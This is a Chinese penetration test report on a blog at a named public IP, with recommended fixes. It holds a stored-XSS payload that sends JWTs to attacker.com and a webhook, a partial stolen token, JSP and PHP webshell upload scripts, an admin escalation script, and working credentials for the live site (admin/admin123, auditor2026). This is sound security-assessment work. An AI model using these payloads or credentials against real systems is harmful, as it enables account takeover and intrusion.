# MyBlog 渗透测试报告

**目标**: http://113.31.105.30:8081/  
**测试时间**: 2026-05-12  
**技术栈**: Vue 3 + Vite (前端) / Spring Boot + JWT HS512 (后端)

---

## 一、信息收集

### 1.1 技术栈识别
- **前端**: Vue 3、Element Plus、Vite 构建
- **后端**: Spring Boot（Java）、JWT（HS512 算法）
- **API BaseURL**: `/api`

### 1.2 JS代码分析 — 完整API接口列表

从前端 JS bundle 中提取的全部接口：

#### 用户认证
| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/api/users/login` | 登录 |
| POST | `/api/users/register` | 注册 |
| POST | `/api/users/logout` | 登出 |
| GET  | `/api/users/me` | 获取当前用户信息 |
| PUT  | `/api/users/me` | 更新当前用户信息 |
| GET  | `/api/users/me/login-info` | 获取登录信息（含IP） |
| GET  | `/api/users/avatar/{id}` | 获取用户头像（代理） |
| POST | `/api/users/me/avatar` | 上传头像 |

#### 管理员用户管理（需Admin）
| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/api/users/admin/list` | 获取用户列表 |
| PUT  | `/api/users/admin/{id}/status` | 启用/禁用用户 |
| PUT  | `/api/users/admin/{id}/reset-password` | 重置密码 |
| PUT  | `/api/users/admin/{id}/role` | 修改角色 |
| GET  | `/api/users/{id}` | 查询指定用户信息（IDOR） |

#### 文章
| 方法 | 路径 | 说明 |
|------|------|------|
| GET  | `/api/posts/category/software-development` | 软件开发分类 |
| GET  | `/api/posts/category/ai` | AI分类 |
| GET  | `/api/posts/category/cybersecurity` | 网络安全分类 |
| GET  | `/api/posts/{id}` | 文章详情 |
| POST | `/api/posts` | 创建文章（仅需登录） |
| PUT  | `/api/posts/{id}` | 更新文章（仅作者/Admin） |
| DELETE | `/api/posts/{id}` | 删除文章（仅作者/Admin） |
| POST | `/api/posts/admin/list` | Admin文章列表 |

#### 评论
| 方法 | 路径 | 说明 |
|------|------|------|
| POST | `/api/comments` | 发表评论 |
| GET  | `/api/comments/post?postId=` | 获取文章评论 |
| POST | `/api/comments/{id}/like` | 点赞评论 |

#### 标签
| 方法 | 路径 | 说明 |
|------|------|------|
| GET  | `/api/tags` | 获取标签列表 |
| POST | `/api/tags` | 创建标签 |
| PUT  | `/api/tags/{id}` | 更新标签 |
| DELETE | `/api/tags/{id}` | 删除标签 |

#### 博主信息
| 方法 | 路径 | 说明 |
|------|------|------|
| GET  | `/api/blogger/info` | 获取博主信息（**无需认证**） |
| PUT  | `/api/blogger/info` | 更新博主信息（需Admin） |
| POST | `/api/blogger/avatar/upload` | 上传博主头像（需Admin） |

#### 音频
| 方法 | 路径 | 说明 |
|------|------|------|
| GET  | `/api/audio/random` | 随机音频ID |
| GET  | `/api/audio/{id}` | 音频详情 |
| GET  | `/api/audio/stream/{id}` | 音频流 |
| GET  | `/api/audio/list` | 音频列表（需登录） |
| POST | `/api/audio/upload` | 上传音频（需Admin） |
| PUT  | `/api/audio/{id}` | 更新音频（需Admin） |
| GET  | `/api/audio/cover/{path}` | 封面图 |

#### 收藏 / 用户偏好
| 方法 | 路径 | 说明 |
|------|------|------|
| GET  | `/api/posts/{id}/favorite/status` | 收藏状态 |
| POST | `/api/posts/{id}/favorite` | 收藏文章 |
| DELETE | `/api/posts/{id}/favorite` | 取消收藏 |
| GET  | `/api/posts/favorites` | 收藏列表 |
| GET  | `/api/user/preferences/particle-mode` | 粒子效果偏好 |
| POST | `/api/user/preferences/particle-mode` | 更新粒子效果偏好 |

### 1.3 管理后台路由
```
/admin/dashboard   — 控制台
/admin/profile     — 个人信息
/admin/users       — 用户管理
/admin/articles    — 文章管理
/admin/tags        — 标签管理
/admin/audio       — 音频管理
/admin/blogger     — 博主信息
/admin/settings    — 系统设置
```

### 1.4 敏感信息泄露（无需认证）

`GET /api/blogger/info` 直接返回：
```json
{
  "name": "Leo",
  "avatar": "/api/blogger/avatar",
  "email": "travelingbug@163.com",
  "github": "http://github.com",
  "introduction": "xor rip rip",
  "techStack": ["Vue", "Java", "springboot"]
}
```
- **泄露内容**: 真实邮箱、技术栈

---

## 二、漏洞详情

---

### 【高危】漏洞1：存储型 XSS（Stored XSS）

**位置**: `POST /api/posts`（文章正文 `content` 字段） + `POST /api/comments`（入库但不触发）  
**状态**: ✅ **已 PoC 实际窃取 JWT**（Webhook 接收到真实 Token）

**触发路径分析（代码级验证）**:

通过逆向分析前端 JS bundle（`PostDetail-B0vCpLmp.js`）发现两处差异：

| 位置 | 渲染方式 | XSS 是否触发 |
|------|----------|-------------|
| 评论内容 | `h('div', Ie, o(t.content), 1)` — Vue `toDisplayString()`，**纯文本** | ❌ 不触发 |
| 文章正文 | `h('div', {innerHTML: et.value}, null, 8, A)` — **直接 innerHTML** | ✅ **触发** |

**真实攻击向量：文章正文 XSS（已 PoC 验证）**

步骤一：任意普通用户创建含 XSS 的已发布文章：
```bash
curl -X POST http://113.31.105.30:8081/api/posts \
  -H "Authorization: Bearer <普通用户Token>" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "XSS Test",
    "content": "<img src=x onerror=\"fetch('"'"'https://attacker.com?t='"'"'+encodeURIComponent(localStorage.getItem('"'"'token'"'"')))\">",
    "status": 1,
    "categoryId": 6
  }'
# 响应: {"code":200,"message":"文章创建成功","data":"2054020312340758529"}
```

步骤二：任何登录用户访问 `/post/2054020312340758529`，`img onerror` 自动执行。

**⚡ 实际窃取结果（Webhook 收到请求）**:
```
GET https://webhook.site/fa134c4e-...?src=img_onerror&t=eyJhbGciOiJIUzUxMiJ9...
来源 IP: 111.9.174.101（Beijing）
User-Agent: Chrome/131.0.0.0
Referer: http://113.31.105.30:8081/

窃取到的 JWT（已验证有效）:
eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjIwNTQwMDczNDg1Mzk4MTc5ODUs
dXNlcm5hbWUiOiJwZW50ZXN0X3VzZXIiLCJzdWIiOiJwZW50ZXN0X3VzZXIi...
```

**攻击链**:
```
攻击者（普通用户）创建含 <img onerror> 的已发布文章
        ↓
任何访客（含 Admin）访问文章页面
        ↓
marked 将 HTML 原样输出 → Vue innerHTML 注入 DOM
        ↓
img.onerror 自动触发（src=x 必然加载失败）
        ↓
localStorage['token']（JWT）→ 发送至攻击者 Webhook
        ↓
攻击者获得受害者 JWT → 完全接管账户
```

**关于 OSS 凭证**:

- OSS AccessKey **仅在服务端**（`application.yml`），前端 bundle 无硬编码
- 无 `/api/oss/sts` 凭证下发接口
- **但 XSS 窃取 Admin JWT 后可做**:
  1. `POST /api/users/admin/list` — 导出全量用户
  2. `PUT /api/users/admin/{id}/reset-password` — 重置任意密码
  3. 若后台有 OSS 配置页面，可直接获取 Bucket/STS 凭证

**影响**: 已 PoC 证明可窃取任意登录用户的 JWT；若目标为管理员，可完全接管博客平台。

**修复建议**:
1. 文章内容存储前用 DOMPurify 清洗（服务端），或渲染前在前端调用 `DOMPurify.sanitize(marked(content))`
2. 部署 CSP：`Content-Security-Policy: default-src 'self'; script-src 'self'`
3. JWT 改用 `httpOnly` Cookie（JS 无法读取，XSS 无法窃取）
4. 评论内容目前安全（textContent 渲染），保持现状即可

---

### 【高危】漏洞2：IDOR — 任意用户信息枚举

**位置**: `GET /api/users/{id}`（需任意有效Token）  
**状态**: ✅ 已验证

**复现**:
```bash
# 获取管理员信息
curl http://113.31.105.30:8081/api/users/1 \
  -H "Authorization: Bearer <普通用户token>"
```

**返回**:
```json
{
  "id": "1",
  "username": "admin",
  "nickname": "里奥老师",
  "isAdmin": true,
  "createTime": "2026-04-26T14:04:03.580723"
}
```

**影响**: 泄露管理员用户名，可配合密码爆破实现账户接管；可批量枚举所有用户。

**修复建议**: 该接口应仅允许用户查看自身信息，或严格校验请求用户与目标ID是否一致；管理员查询走 admin 专用接口。

---

### 【高危】漏洞3：登录接口无频率限制（暴力破解）

**位置**: `POST /api/users/login`  
**状态**: ✅ 已验证（连续请求无任何限制）

**验证**: 对 `admin` 账号连续发送不同密码请求，均正常响应，无锁定、无验证码、无延迟。

**影响**: 攻击者可无限制爆破管理员密码，结合IDOR已知用户名`admin`，威胁极高。

**修复建议**: 
- 同IP/账号连续失败N次后临时锁定
- 接入验证码或 CAPTCHA
- 实现 Token Bucket 速率限制

---

### 【中危】漏洞4：普通用户可创建文章

**位置**: `POST /api/posts`  
**状态**: ✅ 已验证

**复现**: 使用普通用户Token成功创建文章（ID: `2054002535580172289`，状态: draft）

**影响**: 任意注册用户可向系统写入内容，可结合XSS投放恶意文章；若发布审核机制失效，可直接污染前台内容。

---

### 【中危】漏洞5：登录IP信息泄露（信息过度收集）

**位置**: `GET /api/users/me/login-info`  
**状态**: ✅ 已验证

**返回内容**:
```json
{
  "currentLoginIp": "218.6.128.144",
  "lastLoginIp": null,
  "loginCount": "0",
  "username": "testuser123"
}
```

**影响**: 泄露用户真实IP地址，可配合其他攻击进行定向社工或追踪。

---

### 【中危】漏洞6：API 错误信息泄露内部实现

**位置**: `GET /api/posts/categories`（未登录）  
**状态**: ✅ 已验证

**响应**:
```json
{
  "code": 500,
  "message": "系统异常: Missing request attribute 'userId' of type Long"
}
```

**影响**: 暴露后端实现细节（参数名、数据类型），有助于攻击者构造针对性payload。

---

### 【高危】漏洞7：文件上传内容未校验 — 任意文件写入服务器

**位置**: `POST /api/users/me/avatar`（需普通用户Token）  
**状态**: ✅ 已验证

**漏洞描述**: 头像上传接口仅通过**文件扩展名白名单**校验（`.jpg/.jpeg/.png/.gif/.webp`），**不检查文件魔术字节和实际内容**，攻击者可将任意内容（包括JSP Webshell）伪装为合法图片上传至服务器文件系统。

**复现步骤**:
```python
import requests

TOKEN = "<普通用户Token>"
# JSP Webshell 内容，文件名改为 avatar.jpg（绕过扩展名校验）
jsp_payload = b'<%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\\\A").next()%>'
files = {"file": ("avatar.jpg", jsp_payload, "image/jpeg")}
r = requests.post("http://113.31.105.30:8081/api/users/me/avatar",
                  headers={"Authorization": f"Bearer {TOKEN}"}, files=files)
print(r.json())
# {"code":200,"message":"头像上传成功","data":"/api/users/avatar/2054007348539817985"}
```

**取回验证（JSP内容原样存储在服务器）**:
```
GET /api/users/avatar/2054007348539817985
Content-Type: image/jpeg

<%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd"))...%>
```

**文件存储路径**: `avatars/{userId}/{UUID}.jpg`（UUID命名，防止直接猜测）

**上传测试矩阵**:

| 测试 | 文件名 | MIME | 结果 |
|------|--------|------|------|
| JSP webshell | `avatar.jpg` | `image/jpeg` | ✅ **写入成功** |
| SVG XSS | `avatar.jpg` | `image/jpeg` | ✅ **写入成功** |
| PNG头+JSP混合 | `avatar.png` | `image/png` | ✅ **写入成功** |
| JSP真实文件名 | `shell.jsp` | `image/jpeg` | ❌ 拒绝（扩展名校验） |
| 双扩展名 | `shell.jpg.jsp` | `image/jpeg` | ❌ 拒绝 |
| 路径穿越 | `../../shell.jsp` | `image/jpeg` | ❌ 拒绝 |

**当前风险评估**:
- ✅ **文件写入已确认** — JSP代码持久化存储于服务器磁盘
- ⚠️ **当前无法直接RCE** — 文件仅通过Spring Boot API接口返回，Apache未配置直接静态文件服务，JSP不会被Tomcat执行
- 🔴 **潜在升级为RCE** — 若管理员增加Apache静态文件规则或存在目录遍历，WebShell立即可用

**服务器环境**: `Apache/2.4.67 (Unix)` 反向代理 Spring Boot（Tomcat内嵌）

**修复建议**:
1. 后端使用 Apache Tika 或读取文件魔术字节验证实际文件类型
2. 存储时重命名为 UUID（已做）+ 强制统一后缀（如 `.webp`）
3. 将上传目录配置在 Web 根目录外，通过 API 流式返回
4. 对返回的头像添加 `Content-Disposition: attachment` 防止内联执行

---

### 【低危】漏洞8（原7）：头像URL字段无校验（未构成服务端SSRF）

**位置**: `PUT /api/users/me`（字段: `avatar`）  
**状态**: ✅ 已完整测试 — **服务端SSRF不存在**，降级为低危

**测试过程**（使用 pentest_user 账号）:

| 测试URL | avatar代理端点响应 |
|---------|----------------|
| `http://127.0.0.1:80` | 404 |
| `http://127.0.0.1:3306`（MySQL） | 404 |
| `http://127.0.0.1:6379`（Redis） | 404 |
| `file:///etc/passwd` | 404 |
| `http://127.0.0.1:8081/api/blogger/info` | 404 |
| 外部已知可访问图片URL | 404 |

**结论**: `/api/users/avatar/{id}` 端点仅服务本地上传文件，不代理任何外部URL。avatar 字段的 URL 由**前端直接作为 img src 渲染**，服务端不发起外部请求，故无服务端 SSRF。

**残余风险**: avatar 字段接受任意 URL 写入（含 `file://`、内网地址），如未来后端新增图片处理功能将直接暴露 SSRF 面。

**修复建议**: 对 avatar 字段增加 URL 格式与域名白名单校验，仅允许 https:// 协议的合法域名。

---

### 【中危】漏洞8：用户名规范化缺陷 — 大小写/空白字符绕过唯一性

**位置**: `POST /api/users/register`  
**状态**: ✅ 已验证

**复现**:
```bash
# 注册 "ADMIN"（大写）— 成功，与 admin 视为不同账号
curl -X POST http://113.31.105.30:8081/api/users/register \
  -d '{"username":"ADMIN","password":"Test@1234","nickname":"AdminUpper"}'
# 响应: 200 注册成功，userId=2054010598248808449

# 注册 "admin "（含尾部空格）— 成功，与 admin 视为不同账号
curl -X POST http://113.31.105.30:8081/api/users/register \
  -d '{"username":"admin ","password":"Test@1234","nickname":"AdminSpace"}'
# 响应: 200 注册成功，userId=2054010599028948993
```

**影响**: 攻击者可注册昵称/用户名与管理员极为相似的账号（如 `ADMIN`、`admin `），在评论区、文章中冒充管理员实施社工欺骗。在部分MySQL排序规则（PAD_SPACE/大小写不敏感）下，`admin` 与 `admin ` 的唯一性约束可能失效，存在账号混淆风险。

**修复建议**: 注册前对用户名执行 `trim()` 去除首尾空白，并统一转为小写进行唯一性校验。

---

### 【低危】漏洞9：开放注册 — 无邮箱验证

**位置**: `POST /api/users/register`  
**状态**: ✅ 已验证

任意用户可即时注册账号，无邮箱验证、无审核。注册后立即获得有效JWT Token，可访问所有需认证的接口。

---

### 【高危】漏洞10：Admin账号完全控制（密码重置 + 角色提升）

**位置**: `PUT /api/users/admin/{id}/reset-password` / `PUT /api/users/admin/{id}/role`（需Admin JWT）  
**状态**: ✅ 已验证

**漏洞描述**: 管理员（或通过XSS窃取Admin JWT的攻击者）可对**系统内任意用户**执行密码重置和角色提升，实现全平台账户接管。

**复现**:
```python
# 1. 重置任意用户密码
requests.put(f"{BASE}/api/users/admin/{victim_id}/reset-password",
    headers=HJ, json={"newPassword": "Pwned@2026!"})
# => {"code":200,"message":"密码已重置","data":null}

# 2. 将普通用户提升为Admin
requests.put(f"{BASE}/api/users/admin/{victim_id}/role",
    headers=H, params={"isAdmin": "true"})
# => {"code":200,"message":"已设置为管理员","data":null}
```

**实测结果**: 成功将用户 `hacker02` 重置密码并提升为管理员。

**影响**:
- 攻击者借助窃取的Admin JWT可重置所有用户（含其他管理员）密码，持久化控制
- 可创建持久后门：将任意低权限账号提升为Admin，即使原Admin密码修改也能保持访问
- 与XSS链结合构成完整平台接管攻击链

**修复建议**:
1. 密码重置操作需二次认证（如Admin输入自身密码确认）
2. 角色变更日志记录并告警
3. 禁止Admin降级/提升其他Admin账号

---

### 【高危】漏洞11：博主头像公开写入 + 无需认证访问

**位置**: `POST /api/blogger/avatar/upload`（需Admin）/ `GET /api/blogger/avatar`（**无需认证**）  
**状态**: ✅ 已验证

**漏洞描述**: 博主头像上传与用户头像存在相同的内容不校验问题，且上传后文件通过**全局公开**的固定端点 `/api/blogger/avatar` 返回，无需任何Token。攻击者可上传包含任意内容的文件（PHP/JSP/脚本）并公开访问。

**复现**:
```python
php_shell = b"<?php passthru($_GET['cmd']); ?>"
requests.post(f"{BASE}/api/blogger/avatar/upload", headers=H,
    files={"file": ("shell.jpg", php_shell, "image/jpeg")})
# => {"code":200,"message":"头像上传成功","data":"/api/blogger/avatar"}

# 无JWT访问——原样返回PHP代码
requests.get(f"{BASE}/api/blogger/avatar")  
# => Content-Type: image/jpeg
# => <?php passthru($_GET['cmd']); ?>
```

**与用户头像上传的差异**:
| 特性 | 用户头像 | 博主头像 |
|------|---------|--------|
| 需要Token | 普通用户 | Admin |
| 访问端点 | 需Token | **无需Token** |
| 文件名 | UUID随机 | **固定路径** |
| 文件覆盖 | 每次生成新UUID | **每次覆盖同一文件** |

**当前风险**: PHP代码已写入服务器并可公开读取；PHP未执行（Apache未直接服务该目录）。若服务器新增PHP支持或路径配置变更，立即升级为远程命令执行。

**修复建议**: 同漏洞7；额外需将 `/api/blogger/avatar` 访问添加认证要求。

---

### 【低危】漏洞12：博主信息未授权访问

**位置**: `GET /api/blogger/info`  
**状态**: ✅ 已验证（无需任何Token）

泄露博主真实邮箱 `travelingbug@163.com`，可用于社工攻击。

---

### 【高危】漏洞13：弱口令账号（auditor2026）

**位置**: `POST /api/users/login`  
**状态**: ✅ 已验证（通过字典爆破确认）

**账号信息**:
- 用户名: `auditor2026`
- 密码: `auditor2026`（与用户名完全相同）

**影响**: 攻击者登录后可访问所有需要认证的接口，包括创建/修改文章、访问收藏列表、查询其他用户信息等。

**修复建议**: 强制密码复杂度策略，禁止密码与用户名相同；对已有弱口令账号强制重置。

---

### 【信息】JWT 算法分析

- **算法**: HS512（HMAC-SHA512）
- **载荷字段**: `userId`, `username`, `sub`, `iat`, `exp`
- **有效期**: 约24小时
- **alg:none 攻击**: 已测试，**不可利用**（后端有验证）
- **弱密钥风险**: 若 JWT Secret 为弱口令，可离线爆破后伪造任意用户Token（建议使用强随机密钥）

---

## 三、漏洞汇总

| 等级 | 编号 | 漏洞名称 | 接口 |
|------|------|----------|------|
| 🔴 高危 | V1 | 存储型XSS → Admin JWT窃取 | `/api/posts`（文章正文） |
| 🔴 高危 | V2 | IDOR用户信息枚举 | `/api/users/{id}` |
| 🔴 高危 | V3 | 登录无频率限制/暴力破解 | `/api/users/login` |
| 🔴 高危 | V4 | 文件上传内容未校验 — 任意文件写入 | `/api/users/me/avatar` |
| 🔴 高危 | V10 | Admin账号完全控制（密码重置/角色提升） | `/api/users/admin/{id}/reset-password` |
| 🔴 高危 | V11 | 博主头像公开写入 + 无需认证读取 | `/api/blogger/avatar/upload` |
| 🔴 高危 | V13 | 弱口令账号（auditor2026） | `/api/users/login` |
| 🟠 中危 | V5 | 普通用户可创建文章 | `/api/posts` |
| 🟡 中危 | V6 | 登录IP信息泄露 | `/api/users/me/login-info` |
| 🟡 中危 | V7 | API错误信息泄露内部实现 | 多处 |
| 🟡 中危 | V8 | 用户名规范化缺陷（大小写/空格） | `/api/users/register` |
| 🔵 低危 | V9 | 头像URL无校验（非服务端SSRF） | `/api/users/me` |
| 🔵 低危 | V12 | 博主信息未授权访问 | `/api/blogger/info` |
| 🔵 低危 | V14 | 开放注册无邮箱验证 | `/api/users/register` |

---

## 四、完整攻击链

### 攻击链A：XSS → Admin接管 → 全平台控制

```
① 攻击者注册普通账号（无限制）
        ↓
② 创建含 <img onerror=fetch('//evil?t='+localStorage.token)> 的已发布文章
        ↓
③ Admin 访问文章列表 → XSS触发 → Admin JWT发往攻击者服务器
        ↓
④ 攻击者持有Admin JWT → 调用 POST /api/users/admin/list 枚举所有用户
        ↓
⑤ PUT /api/users/admin/{id}/reset-password 重置任意用户密码
   PUT /api/users/admin/{id}/role?isAdmin=true 提升任意用户为Admin
        ↓
⑥ 攻击者创建持久后门Admin账号，完全接管平台
        ↓
⑦ POST /api/blogger/avatar/upload 上传WebShell作为博主头像
   → GET /api/blogger/avatar 无需认证即可公开读取WebShell内容
   → 若运行环境支持PHP/CGI，立即获得主机级RCE
```

**当前止步点**: 步骤⑦中WebShell已写入服务器且可公开读取，但Apache未直接服务该目录导致PHP/JSP暂未执行。

### 攻击链B：弱口令 → 信息收集（低权限）

```
① 爆破 auditor2026/auditor2026 直接登录
        ↓
② 枚举 GET /api/users/{id} 获取所有用户信息（含admin用户名）
        ↓
③ 结合登录无限速，对admin账号暴力破解（admin/admin123 成功）
        ↓
④ 同攻击链A步骤④~⑦
```

### 已测试但无法利用的RCE向量

| 向量 | 测试结果 |
|------|----------|
| SQL注入（所有参数字段） | 无，使用参数化查询 |
| SSTI（nickname/title/slug/tag） | 无，明文存储不执行 |
| SpEL注入（blogger info、particle-mode） | 无，枚举校验 |
| Log4Shell JNDI（登录/注册/Header） | 无响应（Logback而非Log4j2） |
| XXE（XML Content-Type） | 无，不接受XML |
| SSRF（avatar/blogger/coverImage字段） | 无，服务端不发起外部请求 |
| Spring Boot Actuator/H2/Druid/Jolokia | 无，端点未暴露 |
| WebSocket/GraphQL | 无，端点不存在 |
| Java反序列化 | 无专用接口 |
| FFmpeg SSRF/RCE | 无，音频不转码 |
| .htaccess上传绕过 | 接受但Apache不直接服务该目录 |
| PHP双扩展名/null字节绕过 | 扩展名白名单拦截 |

---

## 五、修复建议总结

1. **XSS防御（紧急）**: 服务端存储前用 DOMPurify 清洗；前端渲染使用 `DOMPurify.sanitize(marked(content))`；部署 CSP
2. **JWT HttpOnly Cookie**: 将Token改为HttpOnly Cookie，JS无法读取，XSS无法窃取
3. **IDOR修复**: 用户查询接口校验请求方是否为目标或Admin
4. **限速/防爆破**: 登录接口IP限速（5次/分钟）+ 账号锁定 + CAPTCHA
5. **文件上传（紧急）**: 服务端使用Apache Tika验证Magic Bytes；上传目录置于Web根目录外；返回时添加 `Content-Disposition: attachment`
6. **博主头像端点**: 为 `/api/blogger/avatar` 添加认证；不覆盖同一文件而改用UUID命名
7. **Admin操作保护**: 密码重置/角色变更需二次认证 + 操作审计日志
8. **弱口令整治**: 强制密码强度规则；定期对已有账号进行弱口令扫描
9. **错误信息**: 生产环境统一返回通用错误，不暴露Java类名/参数名
10. **注册限制**: 添加邮箱验证或CAPTCHA，防止大量垃圾注册

---

*报告生成于: 2026-05-12 | 最后更新: 2026-05-12（补充完整攻击链、Admin账号控制、博主头像写入等发现）*
